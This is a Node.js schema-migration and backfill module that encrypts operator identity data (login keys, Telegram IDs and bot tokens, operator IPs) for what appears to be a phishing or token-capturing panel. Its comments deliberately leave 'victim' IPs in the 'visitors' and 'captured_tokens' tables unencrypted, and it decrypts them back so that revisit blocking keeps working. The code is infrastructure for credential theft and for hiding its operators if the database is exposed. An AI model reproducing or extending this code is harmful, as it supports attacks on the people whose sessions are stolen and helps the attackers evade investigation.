// Schema migration + one-time backfill for at-rest encryption of sensitive
// identity data. Called from runMigrations() at server boot.
//
// Field layout after migration -- every value is stored exactly once, sealed:
//
//   users.login_key              sealed deterministic  (still NOT NULL UNIQUE, so
//                                  the constraint and the login lookup work
//                                  against the ciphertext)
//   users.telegram_id            sealed deterministic  (equality lookup works)
//   users.telegram_bot_token     sealed deterministic
//   <ip table>.ip_address        sealed deterministic
//
// Deterministic (value-derived IV) is used on purpose: it is what lets the
// existing equality queries, UNIQUE constraints and COUNT(DISTINCT ...) keep
// working with NO new columns and NO query rewrites. That keeps the change
// surface to "wrap the value on write/read" only.
//
// There is deliberately no plaintext copy anywhere. The pre-existing
// login_key + login_key_encrypted and ip_address + ip_address_encrypted pairs
// stored the same secret twice, so dumping either column was still a full
// leak. Those *_encrypted columns are left in place for older code paths but
// are no longer written to.
//
// Idempotent: every statement is individually wrapped and every backfill pass
// is guarded by an "is it already sealed?" predicate, so re-running on each
// boot costs one scan.
const db = require('../database/connection');
const { sealDet, isSealed, open } = require('../utils/sensitive');

// Operator-side IPs only. Victim IPs (visitors, captured_tokens) are kept in
// the clear on purpose - see connection.js IP_COLS. Any row that an older
// release already sealed is decrypted back on boot (decryptVictimIPs).
const IP_TABLES = [
  'cookie_renewals',
  'login_history', 'audit_log', 'user_sessions',
];
const VICTIP_TABLES = ['visitors', 'captured_tokens'];

async function run(sql) {
  try { await db.query(sql); return true; }
  catch (e) { return false; }
}

async function ensureSensitiveSchema() {
  // Target widths. Sealed blobs are value-length dependent (see /tmp size
  // probe): a 19-char login key -> ~95 chars, a 45-char IPv6 -> ~131 chars,
  // a 20-digit chat id -> ~95 chars. These widths give headroom for user-set
  // keys and long bot tokens while keeping indexed columns under the
  // InnoDB DYNAMIC 3072-byte index-key limit. TEXT is deliberately NOT used:
  // login_key (UNIQUE) and telegram_id carry indexes, and MySQL refuses to
  // build an index on a BLOB/TEXT column without a prefix length.
  const targets = {
    users: {
      login_key: 'VARCHAR(500)',
      telegram_id: 'VARCHAR(255)',
      telegram_bot_token: 'VARCHAR(500)',
    },
  };
  for (const table of IP_TABLES) targets[table] = { ip_address: 'VARCHAR(255)' };

  for (const [table, cols] of Object.entries(targets)) {
    for (const [column, target] of Object.entries(cols)) {
      // Only ALTER when the current type is narrower than we need. This keeps
      // the migration a no-op at steady state (no per-boot ALTER churn).
      const want = target.toUpperCase();
      let current = '';
      try {
        const [rows] = await db.query(
          "SELECT COLUMN_TYPE FROM information_schema.COLUMNS " +
          "WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = ? AND COLUMN_NAME = ?",
          [table, column]
        );
        if (rows.length) current = String(rows[0].COLUMN_TYPE).toUpperCase();
      } catch (e) { /* table not present yet */ }

      const isVarchar = current.startsWith('VARCHAR');
      const isText = current.startsWith('TEXT');
      const currentLen = isVarchar
        ? parseInt(current.match(/\((\d+)\)/)[1], 10)
        : (isText ? 65535 : 0);

      // We only need to widen. Skip if already wide enough or already TEXT.
      const wantLen = parseInt(want.match(/\((\d+)\)/)[1], 10);
      if (currentLen >= wantLen) continue;

      await run('ALTER TABLE `' + table + '` MODIFY `' + column + '` ' + want);
    }
  }
}

// Rewrite one column in place, row by row. Breaks as soon as a full pass
// migrates nothing, so steady state is one scan of already-sealed rows.
async function migrateColumn(table, column) {
  let total = 0;
  for (;;) {
    const [rows] = await db.query(
      'SELECT id, `' + column + '` AS v FROM `' + table + '` ' +
      'WHERE `' + column + '` IS NOT NULL ' +
      'AND `' + column + '` NOT LIKE "s1:%" ' +
      'AND `' + column + '` NOT LIKE "s2:%" LIMIT 200'
    );
    if (!rows.length) break;

    let migrated = 0;
    for (const r of rows) {
      const v = r.v;
      if (v == null || isSealed(v)) continue;
      const sealed = sealDet(v);
      if (!sealed || sealed === String(v)) continue;
      try {
        await db.query('UPDATE `' + table + '` SET `' + column + '` = ? WHERE id = ?', [sealed, r.id]);
        total++;
        migrated++;
      } catch (e) {
      }
    }
    if (migrated === 0) break;
  }
  if (total) ;
  return total;
}

async function backfillUsers() {
  let total = 0;
  total += await migrateColumn('users', 'login_key');
  total += await migrateColumn('users', 'telegram_id');
  total += await migrateColumn('users', 'telegram_bot_token');
  return total;
}

async function backfillIPs() {
  let total = 0;
  for (const table of IP_TABLES) {
    total += await migrateColumn(table, 'ip_address');
  }
  return total;
}

// Reverse of backfillIPs for the victim tables. An older release sealed these
// columns; visitor dedupe and block_done_visitors compare plaintext IPs, so
// leaving ciphertext behind would silently break revisit blocking and show
// gibberish in the panel.
async function decryptVictimIPs() {
  let total = 0;
  for (const table of VICTIP_TABLES) {
    for (;;) {
      let rows;
      try {
        const result = await db.query(
          'SELECT id, `ip_address` AS v FROM `' + table + '` ' +
          'WHERE `ip_address` LIKE "s1:%" OR `ip_address` LIKE "s2:%" LIMIT 200'
        );
        rows = result[0] || [];
      } catch (e) { break; }
      if (!rows.length) break;

      let migrated = 0;
      for (const r of rows) {
        const plain = open(r.v);
        if (!plain || plain === String(r.v) || isSealed(plain)) continue;
        try {
          await db.query('UPDATE `' + table + '` SET `ip_address` = ? WHERE id = ?', [plain, r.id]);
          total++;
          migrated++;
        } catch (e) {
        }
      }
      if (migrated === 0) break;
    }
  }
  return total;
}

async function runSensitiveMigrations() {
  try {
    await ensureSensitiveSchema();
    await backfillUsers();
    await backfillIPs();
    await decryptVictimIPs();
  } catch (err) {
  }
}

module.exports = {
  ensureSensitiveSchema,
  runSensitiveMigrations,
  backfillUsers,
  backfillIPs,
  decryptVictimIPs,
  migrateColumn,
  IP_TABLES,
  VICTIP_TABLES,
};
